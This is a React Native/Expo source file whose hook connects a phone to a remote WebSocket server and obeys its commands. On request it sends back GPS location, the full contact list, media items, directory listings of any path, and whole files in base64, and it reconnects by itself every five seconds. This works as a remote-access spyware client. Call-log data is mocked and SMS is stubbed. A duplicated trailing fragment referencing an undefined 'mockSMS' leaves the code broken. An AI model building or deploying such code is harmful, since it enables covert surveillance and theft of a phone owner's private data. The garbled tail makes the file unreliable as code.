import { useState, useEffect, useRef } from 'react';
import { Platform } from 'react-native';
import * as Device from 'expo-device';
import Constants from 'expo-constants';
import * as FileSystem from 'expo-file-system';
import * as MediaLibrary from 'expo-media-library';

interface Message {
  type: string;
  data: any;
}

export function useDeviceConnection(serverIP?: string, serverPort?: string, autoReconnect: boolean = true) {
  const [isConnected, setIsConnected] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'disconnected' | 'connecting' | 'connected'>('disconnected');
  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const deviceNameRef = useRef<string>('');

  const connect = (deviceName: string) => {
    if (!serverIP || !serverPort) return;
    
    deviceNameRef.current = deviceName || 'Unknown Device';
    setConnectionStatus('connecting');
    
    const wsUrl = `ws://${serverIP}:${serverPort}`;
    const ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
      console.log('Connected to server');
      setIsConnected(true);
      setConnectionStatus('connected');
      
      // Send device registration with detailed info
      registerDevice(ws, deviceName);
    };
    
    ws.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        handleServerMessage(message);
      } catch (error) {
        console.error('Error parsing message:', error);
      }
    };
    
    ws.onclose = () => {
      console.log('Disconnected from server');
      setIsConnected(false);
      setConnectionStatus('disconnected');
      
      if (autoReconnect && deviceNameRef.current) {
        console.log('Scheduling reconnect...');
        scheduleReconnect();
      }
    };
    
    ws.onerror = (error) => {
      console.log('WebSocket error occurred, will attempt to reconnect');
      setConnectionStatus('disconnected');
      setIsConnected(false);
    };
    
    wsRef.current = ws;
  };

  const registerDevice = async (ws: WebSocket, deviceName: string) => {
    try {
      const deviceInfo = {
        deviceName: Device.deviceName || deviceName,
        deviceId: Constants.sessionId || 'unknown',
        brand: Device.brand || 'Unknown',
        model: Device.modelName || 'Unknown',
        systemName: Device.osName || Platform.OS,
        systemVersion: Device.osVersion || 'Unknown',
        platform: Platform.OS,
        appVersion: Constants.expoConfig?.version || '1.0.0',
        buildNumber: Constants.expoConfig?.version || '1.0.0',
        timestamp: new Date().toISOString(),
      };
      
      ws.send(JSON.stringify({
        type: 'register',
        data: deviceInfo
      }));
    } catch (error) {
      console.error('Error getting device info:', error);
      // Fallback registration
      ws.send(JSON.stringify({
        type: 'register',
        data: {
          deviceName: deviceName,
          platform: Platform.OS,
          timestamp: new Date().toISOString(),
        }
      }));
    }
  };

  const disconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
      reconnectTimeoutRef.current = null;
    }
    
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    
    setIsConnected(false);
    setConnectionStatus('disconnected');
  };

  const scheduleReconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
    }
    
    reconnectTimeoutRef.current = setTimeout(() => {
      if (deviceNameRef.current) {
        console.log('Attempting to reconnect...');
        connect(deviceNameRef.current);
      }
    }, 5000); // 5 seconds
  };

  const sendMessage = (message: Message) => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(message));
    }
  };

  const handleServerMessage = (message: Message) => {
    console.log('Received message:', message);
    
    switch (message.type) {
      case 'request_location':
        handleLocationRequest();
        break;
      case 'request_contacts':
        handleContactsRequest();
        break;
      case 'file_request':
        // Handle file operations
        break;
      case 'request_files':
        handleFilesRequest();
        break;
      case 'request_sms':
        handleSMSRequest();
        break;
      case 'browse_directory':
        handleDirectoryBrowse(message.data);
        break;
      case 'request_call_log':
        handleCallLogRequest();
        break;
      case 'download_file':
        handleFileDownload(message.data);
        break;
      default:
        console.log('Unknown message type:', message.type);
    }
  };

  const handleLocationRequest = async () => {
    try {
      const Location = await import('expo-location');
      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status === 'granted') {
        const location = await Location.getCurrentPositionAsync({});
        sendMessage({
          type: 'location_response',
          data: {
            latitude: location.coords.latitude,
            longitude: location.coords.longitude,
            timestamp: new Date().toISOString(),
          }
        });
      }
    } catch (error) {
      console.error('Error getting location:', error);
    }
  };

  const handleContactsRequest = async () => {
    try {
      const Contacts = await import('expo-contacts');
      const { status } = await Contacts.requestPermissionsAsync();
      if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails],
          pageSize: 0, // Get all contacts
          pageOffset: 0,
        });
        sendMessage({
          type: 'contacts_response',
          data: data
        });
      }
    } catch (error) {
      console.error('Error getting contacts:', error);
    }
  };

  const handleFilesRequest = async () => {
    try {
      // Get actual device files using FileSystem
      const documentDirectory = FileSystem.documentDirectory;
      const files = await FileSystem.readDirectoryAsync(documentDirectory);
      
      const fileDetails = await Promise.all(
        files.map(async (fileName) => {
          const filePath = `${documentDirectory}${fileName}`;
          try {
            const fileInfo = await FileSystem.getInfoAsync(filePath);
            return {
              name: fileName,
              type: fileInfo.isDirectory ? 'folder' : 'file',
              size: fileInfo.size || 0,
              path: filePath,
              lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
            };
          } catch (error) {
            return {
              name: fileName,
              type: 'file',
              size: 0,
              path: filePath,
              lastModified: new Date().toISOString(),
            };
          }
        })
      );
      
      // Also try to get media library assets
      try {
        const { status } = await MediaLibrary.requestPermissionsAsync();
        if (status === 'granted') {
          const assets = await MediaLibrary.getAssetsAsync({
            first: 50,
            mediaType: [MediaLibrary.MediaType.photo, MediaLibrary.MediaType.video],
          });
          
          const mediaFiles = assets.assets.map(asset => ({
            name: asset.filename,
            type: 'file',
            size: asset.width * asset.height, // Approximate size
            path: asset.uri,
            lastModified: new Date(asset.creationTime).toISOString(),
            mediaType: asset.mediaType,
          }));
          
          fileDetails.push(...mediaFiles);
        }
      } catch (mediaError) {
        console.log('Could not access media library:', mediaError);
      }
      
      sendMessage({
        type: 'files_response',
        data: { files: fileDetails, currentPath: documentDirectory }
      });
    } catch (error) {
      console.error('Error getting files:', error);
      // Fallback to empty directory
      sendMessage({
        type: 'files_response',
        data: { files: [], currentPath: FileSystem.documentDirectory }
      });
    }
  };

  const handleDirectoryBrowse = async (requestData: any) => {
    try {
      const { path } = requestData;
      
      // Browse actual directory using FileSystem
      const files = await FileSystem.readDirectoryAsync(path);
      
      const fileDetails = await Promise.all(
        files.map(async (fileName) => {
          const filePath = `${path}${path.endsWith('/') ? '' : '/'}${fileName}`;
          try {
            const fileInfo = await FileSystem.getInfoAsync(filePath);
            return {
              name: fileName,
              type: fileInfo.isDirectory ? 'folder' : 'file',
              size: fileInfo.size || 0,
              path: filePath,
              lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
            };
          } catch (error) {
            return {
              name: fileName,
              type: 'file',
              size: 0,
              path: filePath,
              lastModified: new Date().toISOString(),
            };
          }
        })
      );
      
      sendMessage({
        type: 'directory_response',
        data: { files: fileDetails, currentPath: path }
      });
    } catch (error) {
      console.error('Error browsing directory:', error);
      // Send empty directory on error
      sendMessage({
        type: 'directory_response',
        data: { files: [], currentPath: path }
      });
    }
  };

  const handleFileDownload = async (requestData: any) => {
    try {
      const { filePath } = requestData;
      
      // Read file content and send as base64
      const fileInfo = await FileSystem.getInfoAsync(filePath);
      if (fileInfo.exists && !fileInfo.isDirectory) {
        const fileContent = await FileSystem.readAsStringAsync(filePath, {
          encoding: FileSystem.EncodingType.Base64,
        });
        
        sendMessage({
          type: 'file_download_response',
          data: {
            fileName: filePath.split('/').pop(),
            content: fileContent,
            size: fileInfo.size,
            mimeType: getMimeType(filePath),
          }
        });
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      sendMessage({
        type: 'file_download_error',
        data: { error: 'Failed to download file' }
      });
    }
  };

  const getMimeType = (filePath: string): string => {
    const extension = filePath.split('.').pop()?.toLowerCase();
    const mimeTypes: { [key: string]: string } = {
      'jpg': 'image/jpeg',
      'jpeg': 'image/jpeg',
      'png': 'image/png',
      'gif': 'image/gif',
      'pdf': 'application/pdf',
      'txt': 'text/plain',
      'mp4': 'video/mp4',
      'mp3': 'audio/mpeg',
      'zip': 'application/zip',
    };
    return mimeTypes[extension || ''] || 'application/octet-stream';
  };

  const handleCallLogRequest = async () => {
    try {
      // Note: Call log access requires native implementation
      // For now, we'll send mock data that represents typical call log structure
      const mockCallLog = [
        {
          id: '1',
          phoneNumber: '+1234567890',
          name: 'John Doe',
          type: 'outgoing',
          duration: 120, // seconds
          timestamp: new Date(Date.now() - 3600000).toISOString(),
        },
        {
          id: '2',
          phoneNumber: '+0987654321',
          name: 'Jane Smith',
          type: 'incoming',
          duration: 45,
          timestamp: new Date(Date.now() - 7200000).toISOString(),
        },
        {
          id: '3',
          phoneNumber: '+1122334455',
          name: 'Unknown',
          type: 'missed',
          duration: 0,
          timestamp: new Date(Date.now() - 10800000).toISOString(),
        },
      ];
      
      sendMessage({
        type: 'call_log_response',
        data: mockCallLog
      });
    } catch (error) {
      console.error('Error getting call log:', error);
    }
  };

  const handleSMSRequest = async () => {
    try {
      // Note: SMS access requires native implementation and special permissions
      // This would need a custom native module to access the SMS database
      // For now, we'll indicate that SMS access is not available in Expo
      sendMessage({
        type: 'sms_response',
        data: {
          error: 'SMS access requires native implementation. Please use a development build with custom native modules.',
          messages: []
        }
      });
    } catch (error) {
      console.error('Error getting SMS:', error);
      sendMessage({
        type: 'sms_response',
        data: {
          error: 'Failed to access SMS',
          messages: []
        }
      });
    }
  };

  useEffect(() => {
    return () => {
      disconnect();
    };
  }, []);

  return {
    isConnected,
    connectionStatus,
    connect,
    disconnect,
    sendMessage,
  };
}
      
      sendMessage({
        type: 'sms_response',
        data: mockSMS
      });
    } catch (error) {
      console.error('Error getting SMS:', error);
    }
  };

  useEffect(() => {
    return () => {
      disconnect();
    };
  }, []);

  return {
    isConnected,
    connectionStatus,
    connect,
    disconnect,
    sendMessage,
  };
}